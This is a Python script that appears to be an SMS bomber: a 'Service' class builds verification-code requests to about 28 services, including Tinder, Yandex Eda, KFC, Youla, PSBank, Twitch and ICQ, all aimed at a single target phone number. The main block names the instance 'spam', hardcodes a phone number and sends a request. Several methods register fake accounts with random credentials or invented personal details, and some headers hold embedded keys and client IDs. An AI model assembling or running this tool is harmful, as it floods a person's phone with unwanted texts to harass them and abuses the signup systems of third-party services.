import random
import requests
class Service:
    def __init__(self, number):
        self.number = number
        self._phone9 = number[1:]
        self._phoneAresBank = '+' + number[0] + '(' + number[1:4] + ')' + number[4:7] + '-' + number[7:9] + '-' + number[9:11]  # +7+(915)350-99-08
        self._phone9dostavista = self._phone9[:3] + '+' + self._phone9[3:6] + '-' + self._phone9[6:8] + '-' + self._phone9[8:10]  # 915+350-99-08
        self._phoneOstin = '+' + number[0] + '+(' + number[1:4] + ')' + number[4:7] + '-' + number[7:9] + '-' + number[9:11]  # '+7+(915)350-99-08'
        self._phonePizzahut = '+' + number[0] + ' (' + number[1:4] + ') ' + number[4:7] + ' ' + number[7:9] + ' ' + number[9:11]  # '+7 (915) 350 99 08'
        self._phoneGorzdrav = number[1:4] + ') ' + number[4:7] + '-' + number[7:9] + '-' + number[9:11]  # '915) 350-99-08'

    def get_random(self, mode):
        _name = ''
        password = ''
        username = ''
        for x in range(12):
            _name = _name + random.choice(list('123456789qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM'))
            password = _name + random.choice(list('123456789qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM'))
            username = _name + random.choice(list('123456789qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM'))
            email = _name + random.choice(list('123456789qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM'))
        email += '@gmail.com'
        if mode == 'name':
            return _name
        elif mode=='username':
            return username
        elif mode=='password':
            return password
        elif mode=='email':
            return email

    def tinder(self):
        url = 'https://api.gotinder.com/v2/auth/sms/send?auth_type=sms&locale=ru'
        par = {"phone_number": self.number}
        headers = {'Accept-Language': 'en-US,en;q=0.5','Connection': 'keep-alive','Host': 'api.gotinder.com','Origin': 'Origin: https://tinder.com','Referer': 'Referer: https://tinder.com/',}
        ret = url, par, headers
        return ret

    def p_food(self):
        url = 'https://api.crm.p-group.ru/checkout/login'
        par = {'departmentId': '2','phone': self.number,'recaptchaToken': '321','regionId': '2'}
        headers = {'Host': 'api.crm.p-group.ru','Accept': 'application/json, text/plain, */*','Accept-Language': 'en-US,en;q=0.5','Accept-Encoding': 'gzip, deflate, br','Referer': 'https://levelkitchen.com/auth/?r=1','Content-Type': 'application/json;charset=utf-8','x-keypass': 'lebfgiuDaeEYiou2%3255$208@{wdw{]}','Content-Length': '76','Origin': 'https://levelkitchen.com','Connection': 'keep-alive'}
        ret = url, par, headers
        return ret

    def utair(self):
        url = 'https://b.utair.ru/api/v1/login/'
        par = {'login': self.number}
        headers = {'Accept-Language': 'en-US,en;q=0.5','Connection': 'keep-alive','Host': "eda.yandex",'Origin': 'https://www.utair.ru','Referer': 'https://www.utair.ru/?utm_medium=cpc&utm_content=us_nch&utm_campaign=brand&utm_source=google&gclid=CjwKCAiA8qLvBRAbEiwAE_ZzPRReyLDS1BF2tCa1R2EKtu-Nk_rA2UU7zDAliTQVd4jaRRZx2AEP1BoCMWwQAvD_BwE',}
        ret = url, par, headers
        return ret

    def y_eda(self): #лимит 10 в день # delay 60
        url = 'https://eda.yandex/api/v1/user/request_authentication_code'
        par = {'phone_number': '+' + self.number}
        headers = {'Host': 'eda.yandex','Accept-Language': 'en-US,en;q=0.5','Referer': 'https://eda.yandex/moscow?gclid=CjwKCAiAlajvBRB_EiwA4vAqiOQkNXLr2CJQi-WoV0iKSay3JDNd3vOuYBnheMvTHc7tFs7xsw_QIRoCLyEQAvD_BwE&utm_campaign=%5BEDA%5DDT_UA-goal_RU-MOS-MOW_category-Deliveryfood_restype-search_NU%7C1551558658&utm_content&utm_medium=cpc&utm_source=google&utm_term=%D0%B4%D0%BE%D1%81%D1%82%D0%B0%D0%B2%D0%BA%D0%B0%20%D0%B5%D0%B4%D1%8B%20%D0%BC%D0%BE%D1%81%D0%BA%D0%B2%D0%B0%7Cgid%7C62791647321%7Ctid%7Ckwd-298707810697','Content-Type': 'application/json;charset=utf-8','Connection': 'keep-alive','User-Agent': 'Mozilla/5.0 (X11; Linux i686; rv:68.0) Gecko/20100101 Firefox/68.0','X-App-Version': '14.0.2','X-Platform': 'desktop_web'}
        ret = url, par, headers
        return ret

    def azbuka(self): # delay 60
        url = 'https://oauth.av.ru/check-phone'
        n_num = '+' + self.number[0] + ' ' + '(' + self.number[1:4] + ')' + ' ' + self.number[4:7] + '-' + self.number[7:9] + '-' + self.number[9:]
        par = {"phone": n_num}
        headers = {'Host': 'oauth.av.ru','Accept-Language': 'en-US,en;q=0.5','Referer': 'https://oauth.av.ru/','Content-Type': 'application/json;charset=utf-8','Connection': 'keep-alive',}
        ret = url, par, headers
        return ret

    def y_chef(self):
        url = 'https://api.chef.yandex/api/v2/auth/sms'
        par = {'phone': self.number[1:]}
        head = {'Accept-Language': 'en-US,en;q=0.5','Connection': 'keep-alive','Content-Length': '22','Content-Type': 'application/json;charset=utf-8','Host': 'api.chef.yandex','Origin': 'https://chef.yandex','Referer': 'https://chef.yandex/login',}
        ret = url, par, head
        return ret

    def kfc(self):
        url = 'https://api.kfc.com/api/users/v1/user.verify'

        par = {"device": {"deviceId": "new_kfc_web_site", "deviceType": "mobile"},"createdAt": "2018-11-07T13:17:24.534Z","phone": '+' + self.number}
        head = {'Accept-Language': 'en-US,en;q=0.5','Connection': 'keep-alive','Content-Length': '126','Content-Type': 'application/x-www-form-urlencoded','Host': 'api.kfc.com','Origin': 'https://www.kfc.ru','Referer': 'https://www.kfc.ru/login',}
        ret = url, par, head
        return ret

    def barbeq(self):
        url = 'https://barabeq.ru/product/api/lead/sendcode'
        n_num = '+' + self.number[0] + ' ' + '(' + self.number[1:4] + ')' + ' ' + self.number[4:7] + '-' + self.number[7:9] + '-' + self.number[9:]
        par = {'phone': n_num,}
        head = {'Accept':'application/json, text/plain, */*','Accept-Language': 'en-US,en;q=0.5','Connection': 'keep-alive','Content-Type': 'application/json','Host': 'barabeq.ru','Referer': 'https://barabeq.ru/login',}
        ret = url, par, head
        return ret

    def yola(self):
        url = 'https://youla.ru/web-api/auth/request_code'
        par = {'phone':	'+' + self.number}
        headers = {'Accept': '*/*','Accept-Encoding': 'gzip, deflate, br','Accept-Language': 'en-US,en;q=0.5','Connection': 'keep-alive','Content-Length': '24','Content-Type': 'application/json; charset=utf-8','Host': 'youla.ru','Referer': 'https://youla.ru/','User-Agent': 'Mozilla/5.0 (X11; Linux i686; rv:68.0) Gecko/20100101 Firefox/68.0',}
        ret = url, par, headers
        return ret

    def rutube(self):
        url = 'https://rutube.ru/api/accounts/sendpass/phone'
        par = {'phone':'+'+self.number}
        headers = {}
        ret = url, par, headers
        return ret

    def sunlight(self):
        url = 'https://api.sunlight.net/v3/customers/authorization/'
        par = {'phone': self.number}
        headers = {}
        ret = url, par, headers
        return ret

    def mtstv(self):
        url = 'https://api.mtstv.ru/v1/users'
        par = {'msisdn': self.number}
        headers = {}
        ret = url, par, headers
        return ret

    def psbank(self):
        url = 'https://ib.psbank.ru/api/authentication/extendedClientAuthRequest'
        par = {'firstName':'Иван','middleName':'Иванович','lastName':'Иванов','sex':'1','birthDate':'10.10.2000','mobilePhone': self.number[1:],'russianFederationResident':'true','isDSA':'false','personalDataProcessingAgreement':'true','bKIRequestAgreement':'null','promotionAgreement':'true'}
        headers = {}
        ret = url, par, headers
        return ret

    def karusel(self):
        url = 'https://app.karusel.ru/api/v1/phone/'
        par = {'phone': self.number}
        headers = {}
        ret = url, par, headers
        return ret

    def cloudmail(self):
        url = 'https://cloud.mail.ru/api/v2/notify/applink'
        par = {"phone": "+" + self.number, "api": 2, "email": "email","x-email": "x-email"}
        headers = {}
        ret = url, par, headers
        return ret

    def ok(self):
        url = "https://ok.ru/dk?cmd=AnonymRegistrationEnterPhone&st.cmd=anonymRegistrationEnterPhone"
        par = {"st.r.phone": "+" + self.number}
        headers = {}
        ret = url, par, headers
        return ret

    def qlean(self):
        url = "https://qlean.ru/clients-api/v2/sms_codes/auth/request_code"
        par = {"phone": self.number}
        headers = {}
        ret = url, par, headers
        return ret

    def Twitch(self):
        url = 'https://passport.twitch.tv/register?trusted_request=true'
        username = self.get_random('username')
        password = self.get_random('password')
        par = {"birthday": {"day": 11, "month": 11, "year": 1999},"client_id": "kd1unb4b3q4t58fwlpcbzcbnm76a8fp", "include_verification_code": True,"password": password, "phone_number": self.number,"username": username}
        headers = {}
        ret = url, par, headers
        return ret

    def delimobil(self):
        url = "https://api.delitime.ru/api/v2/signup"
        par = {"SignupForm[username]": self.number, "SignupForm[device_type]": 3}
        headers = {}
        ret = url, par, headers
        return ret

    def icq(self):
        url = 'https://www.icq.com/smsreg/requestPhoneValidation.php'
        par = {'msisdn': self.number, "locale": 'en', 'countryCode': 'ru','version': '1', "k": "ic1rtwz1s1Hj1O0r", "r": "46763"}
        headers = {}
        ret = url, par, headers
        return ret

    def indriver(self):
        url = "https://terra-1.indriverapp.com/api/authorization?locale=ru"
        par = {"mode": "request", "phone": "+" + self.number,"phone_permission": "unknown", "stream_id": 0, "v": 3, "appversion": "3.20.6","osversion": "unknown", "devicemodel": "unknown"}
        headers = {}
        ret = url, par, headers
        return ret

    def invitro(self):
        url = "https://lk.invitro.ru/sp/mobileApi/createUserByPassword"
        password = self.get_random('password')
        par = {"password": password, "application": "lkp", "login": "+" + self.number}
        headers = {}
        ret = url, par, headers
        return ret

    def iqos(self):
        url = 'https://ube.pmsm.org.ru/esb/iqos-phone/validate'
        par = {"phone": self.number}
        headers = {}
        ret = url, par, headers
        return ret

    def ivi(self):
        url = "https://api.ivi.ru/mobileapi/user/register/phone/v6"
        par = {"phone": self.number}
        headers = {}
        ret = url, par, headers
        return ret



if __name__ == '__main__':
    number ="79535723263" #79506161299'
    spam = Service(number)
    username = spam.get_random('username')
    password = spam.get_random('password')
    email = spam.get_random('email')
    r = requests.get('https://findclone.ru/register', params={'phone': '+' + number})
    #
    #
    #
    #



























    print(r.status_code)
